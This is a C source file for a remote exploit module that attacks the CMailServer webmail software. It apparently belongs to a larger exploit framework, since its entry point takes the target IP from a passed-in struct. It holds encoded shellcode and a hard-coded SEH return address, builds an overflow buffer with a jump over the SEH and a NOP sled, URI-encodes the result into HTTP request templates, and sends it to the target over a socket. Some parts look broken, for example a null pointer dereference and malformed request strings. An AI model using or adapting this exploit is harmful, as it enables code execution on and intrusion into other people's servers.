
#include "Include.h"
#include "externs.h"

#pragma comment(lib,"ws2_32")


void print_info_banner_line2(const char * key, const char * val);

void extract_ip_and_port2( char * &remotehost, int * port, char * str);
int  fill_payload_args2(int sh, int bport, char * reverseip, int reverseport, struct h2readyp * xx);

int hr2_connect2(char * remotehost, int port, int timeout);
int hr2_udpconnect2(char * remotehost, int port,  struct sockaddr_in * addr, int timeout);
int hr2_updsend2(char * remotehost, unsigned char * buf, unsigned int len, int port, struct sockaddr_in * addr, int timeout);
int execute2(struct _buf2 * abuf, char * remotehost, int port);

struct _buf2 
{
	unsigned char * ptr;
	unsigned int size;
};
int construct_shellcode2(int sh, struct _buf2 * shf, int target);
int construct_buffer2(struct _buf2 * shf, int target, struct _buf2 * abuf);



int getopt2(int argc, char *argv[], char *optstring);
char	*optarg2;	
int		optind2 = 0, opterr2; 



struct {
	const char * name2;
	int length2;
	char *shellcode2;	
}shellcodes2[]={ 
	

        "\x2b\xc9\x83\xe9\xde\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e\xcf"
        "\x67\x5f\x11\x83\xee\xfc\xe2\xf4\x33\x8f\x1b\x11\xcf\x67\xd4\x54"
        "\xf3\xec\x23\x14\xb7\x66\xb0\x9a\x80\x7f\xd4\x4e\xef\x66\xb4\x58"
        "\x44\x53\xd4\x10\x21\x56\x9f\x88\x63\xe3\x9f\x65\xc8\xa6\x95\x1c"
        "\xce\xa5\xb4\xe5\xf4\x33\x7b\x15\xba\x82\xd4\x4e\xeb\x66\xb4\x77"
        "\x44\x6b\x14\x9a\x90\x7b\x5e\xfa\x44\x7b\xd4\x10\x24\xee\x03\x35"
        "\xcb\xa4\x6e\xd1\xab\xec\x1f\x21\x4a\xa7\x27\x1d\x44\x27\x53\x9a"
        "\xbf\x7b\xf2\x9a\xa7\x6f\xb4\x18\x44\xe7\xef\x11\xcf\x67\xd4\x79"
        "\xf3\x38\x6e\xe7\xaf\x31\xd6\xe9\x4c\xa7\x24\x41\xa7\x97\xd5\x15"
        "\x90\x0f\xc7\xef\x45\x69\x08\xee\x28\x04\x3e\x7d\xac\x67\x5f\x11"
        "\xeb\x10\x90\x90"
		
};
 


 
struct _target2{
	const char *t ;
	unsigned long ret ;
} targets[]=
{	

	{"CMaiLServer 1million  & 270 hits on google first to port RiMp ", 0x67672190 }, 
	{NULL,                                        0x00000000 }
};


unsigned char payloadbuffer2[10000], a_buffer2[10000];
long dwTimeout2=5000;
int timeout2=5000;


void CmailServer(ExploitInfo_s* pExploitInfo)
{
	char c,*remotehost=NULL,temp1[100];
	int sh,port=80,itarget=0;
	struct _buf2  fshellcode, sbuffer;

	
	WSADATA wsa;
	WSAStartup(MAKEWORD(2,0), &wsa);
	sh=0;	

    *remotehost =  pExploitInfo->dwRemoteIp;
	fflush(stdout);

	memset(payloadbuffer2, 0, sizeof(payloadbuffer2));

	fshellcode.ptr=payloadbuffer2;
	fshellcode.size=0;	

	memset(a_buffer2, 0, sizeof(a_buffer2));
	sbuffer.ptr=a_buffer2;
	sbuffer.size=0;

	if(!construct_shellcode2(sh, &fshellcode, itarget))
	{
		WSACleanup();
	}

	
	if(!construct_buffer2(&fshellcode, itarget, &sbuffer))
	{
		WSACleanup();
	}
	

	if(!execute2(&sbuffer, remotehost, port))
	{
		WSACleanup();
	}

	WSACleanup();
}

int construct_shellcode2(int sh, struct _buf2 * shf, int target)
{
	memcpy(shf->ptr, shellcodes2[sh].shellcode2, shellcodes2[sh].length2);
	shf->size=shellcodes2[sh].length2;

	return 1;
}

char tempp2[]  =
            "login.asp HTTP/1.0"
            "Content-Type: application/x-www-form-urlencoded"
			"Content-Length: SaveUserPass=1;"
			"Pass=password;" 
			"User=bookoo;"
            "Connection: Close\r\n";
			
char tempp1[] = 
			"Signup=1&Account=bookoo&Pass=password&RePass=password&UserName=&Comment=User&POP3Mail=%40ieqowieoqw.com"
			"/mail/signup.asp HTTP/1.0\r\nHost: $host\r\nUser-Agent: $agent\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length:\r\nConnection: Close\r\n\r\n$d";
	

int encode_uri2(char * in, int len, char * out, int *outlen)
{
	char *out2=out;
	int i;
	memset(out,0,*outlen);
	for(i=0;i<len;i++)
	{
		*out++='%';
		sprintf(out, "%.2x", (unsigned char)in[i]);
		out+=2;
	}
	*outlen=(int)(out-out2);
	return 0;
}



int construct_buffer2(struct _buf2 * shf, int target, struct _buf2 * abuf)
{
	unsigned char * cp;
	char *lp ;
	char buf[10000], buf2[10000],rstr1[10000],rstr2[10000];
	int  olen;

	cp = abuf->ptr;

	memset(buf,0,sizeof(buf));
	memset(buf2,0,sizeof(buf2));
	memset(rstr1,0,sizeof(rstr1));
	memset(rstr2,0,sizeof(rstr2));

	lp=buf;	

		// overflow
	memset(lp,'\x61',476);
	lp+=476;	

		// jmp over seh
	*lp++='\x90';
	*lp++='\x90';
	*lp++='\xeb';
	*lp++='\x04';

		// replace SEH
	*lp++ = (char)((targets[target].ret      ) & 0xff);
	*lp++ = (char)((targets[target].ret >>  8) & 0xff);
	*lp++ = (char)((targets[target].ret >> 16) & 0xff);
	*lp++ = (char)((targets[target].ret >> 24) & 0xff);

	memset(lp,'\x90',1500);
	lp+=5;

	memcpy(lp, shf->ptr, shf->size);
	lp+=shf->size;


	olen = 1500;
	encode_uri2(buf, (int)strlen(buf), buf2, &olen);
	sprintf(rstr2,tempp2,buf2);
	sprintf(rstr1,tempp1,strlen(rstr2));

	strcat((char*)cp,rstr1);
	strcat((char*)cp,rstr2);

	cp+=strlen((char*)cp);
	abuf->size=(int)(cp-abuf->ptr);
	return 1;
}


void extract_ip_and_port2( char * &remotehost, int * port, char * str)
{
	if (strchr(str,':')==NULL)
	{
		remotehost=str;
	}else 
	{
		sscanf(strchr(str,':')+1, "%d", port);
		remotehost=str;
		*(strchr(remotehost,':'))='\0';
	}
}



int hr2_connect2(char * remotehost, int port, int timeout)
{
	SOCKET s;
	struct hostent *host;
	struct sockaddr_in addr;
	TIMEVAL stTime;
	TIMEVAL *pstTime = NULL;
	fd_set x;
	int res;

	if (INFINITE != timeout) 
	{
		stTime.tv_sec = timeout / 1000;
		stTime.tv_usec = timeout % 1000;
		pstTime = &stTime;
	}

	host = gethostbyname(remotehost);
	if (!host) return SOCKET_ERROR;

	addr.sin_addr = *(struct in_addr*)host->h_addr;
	addr.sin_port = htons(port);
	addr.sin_family = AF_INET;

	s = socket(AF_INET, SOCK_STREAM, 0);
	if (s == SOCKET_ERROR)
	{
		closesocket(s);
		return SOCKET_ERROR;
	}

	unsigned long l = 1;
	ioctlsocket( s, FIONBIO, &l ) ;

	connect(s, (struct sockaddr*)&addr, sizeof(addr));

	FD_ZERO(&x);
	FD_SET(s, &x);

	res = select(NULL,NULL,&x,NULL,pstTime);
	if(res< 0) return SOCKET_ERROR;
	if(res==0) return 0;
	return (int)s;
}


int hr2_tcpsend2(SOCKET s, unsigned char * buf, unsigned int len, int timeout)
{
	return send(s, (char *)buf, len, 0);
}

int hr2_tcprecv2(SOCKET s, unsigned char * buf, unsigned int len, int timeout)
{
	TIMEVAL stTime;
	TIMEVAL *pstTime = NULL;
	fd_set xy;
	int res;

	if (INFINITE != timeout) 
	{
		stTime.tv_sec = timeout / 1000;
		stTime.tv_usec = timeout % 1000;
		pstTime = &stTime;
	}
	FD_ZERO(&xy);
	FD_SET(s, &xy);
	
	res = select(NULL,&xy,NULL,NULL,pstTime);

	if(res==0) return 0;
	if(res<0) return -1;

	return recv(s, (char *)buf, len, 0);
}

int execute2(struct _buf2 * abuf, char * remotehost, int port)
{
	int x;
	SOCKET s ;
	char RECVB[10000];

	s = hr2_connect2(remotehost, port, 10000);
	if(s==0)
	{
	//	printf("   [-] connect() timeout\n");
		return 0;
	}
	if(s==SOCKET_ERROR)
	{
	//	printf("   [-] Connection failed\n");
		return 0;
	}		
	x = hr2_tcpsend2(s, abuf->ptr, abuf->size, 0);
//	printf("   [+] Sent %d out of %d bytes\n", x, abuf->size);

	x = hr2_tcprecv2(s, (unsigned char *)RECVB, 1000, 0);
	
	closesocket(s);
	return 1;
}

// -----------------------------------------------------------------
// XGetopt.cpp  Version 1.2
// -----------------------------------------------------------------
int getopt2(int argc, char *argv[], char *optstring)
{
	static char *next = NULL;
	if (optind2 == 0)
		next = NULL;

	optarg2 = NULL;

	if (next == NULL || *next == '\0')
	{
		if (optind2 == 0)
			optind2++;

		if (optind2 >= argc || argv[optind2][0] != '-' || argv[optind2][1] == '\0')
		{
			optarg2 = NULL;
			if (optind2 < argc)
				optarg2 = argv[optind2];
			return EOF;
		}

		if (strcmp(argv[optind2], "--") == 0)
		{
			optind2++;
			optarg2 = NULL;
			if (optind2 < argc)
				optarg2 = argv[optind2];
			return EOF;
		}

		next = argv[optind2];
		next++;		// skip past -
		optind2++;
	}

	char c = *next++;
	char *cp = strchr(optstring, c);

	if (cp == NULL || c == ':')
		return '?';

	cp++;
	if (*cp == ':')
	{
		if (*next != '\0')
		{
			optarg2 = next;
			next = NULL;
		}
		else if (optind2 < argc)
		{
			optarg2 = argv[optind2];
			optind2++;
		}
		else
		{
			return '?';
		}
	}

	return c;
}      
// -----------------------------------------------------------------
// -----------------------------------------------------------------
// -----------------------------------------------------------------

void print_info_banner_line2(const char * key, const char * val)
{
	char temp1[100], temp2[100];

	memset(temp1,0,sizeof(temp1));	
	memset(temp1, '\x20' , 58 - strlen(val) -1);	

	memset(temp2,0,sizeof(temp2));
	memset(temp2, '\x20' , 8 - strlen(key));	
//	printf(" #  %s%s: %s%s# \n", key, temp2, val, temp1);	

}




